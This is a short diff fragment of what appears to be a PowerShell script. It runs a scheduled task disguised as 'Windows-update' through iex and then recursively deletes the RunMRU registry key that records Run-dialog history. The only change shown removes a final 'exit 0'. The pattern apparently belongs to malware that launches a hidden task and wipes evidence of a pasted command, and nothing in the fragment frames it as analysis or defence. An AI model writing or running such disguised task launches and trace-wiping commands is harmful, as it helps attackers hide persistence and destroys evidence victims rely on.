@@ -13,4 +13,3 @@ $command = 'schtasks.exe /run /tn Windows-update'
 iex $command
 $command = 'Remove-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse'
 iex $command
-exit 0
